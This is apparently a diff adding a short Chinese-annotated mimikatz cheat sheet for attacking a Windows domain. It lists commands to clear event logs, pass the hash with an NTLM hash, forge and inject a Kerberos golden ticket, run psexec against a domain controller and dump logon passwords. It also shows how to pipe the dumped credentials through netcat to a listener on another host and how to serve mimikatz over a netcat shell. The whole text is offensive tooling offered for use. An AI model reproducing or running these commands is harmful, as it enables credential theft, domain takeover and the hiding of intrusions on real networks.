@@ -1,0 +1,29 @@
+mimikatz:
+event::clear 清理
+sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a  可以直接创建net use \\192.168.19.1
+sekurlsa::pth /user:Administrator /domain:test.local /ntlm:cc36cf7a8514893efccd332446158b1a  /run:powershell.exe 
+
+生成黄金票据(xp下未成功)：
+lsadump::lsa /patch
+kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-2848411111-3820811111-1717111111 /krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi
+
+导入： 
+kerberos::ptt test.kirbi       
+kerberos::list
+psexec \\dc cmd.exe
+net use \\192.168.19.1
+
+
+
+C:\>mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit && dir
+C:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit >> log.txt
+
+E:\>nc -lvp 4444
+C:\>mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit | nc.exe -vv 192.168.52.1 4444
+
+
+C:\>nc -lvp 443
+E:\>nc.exe -vv 192.168.52.128 443 -e mimikatz.exe 
+
+
+
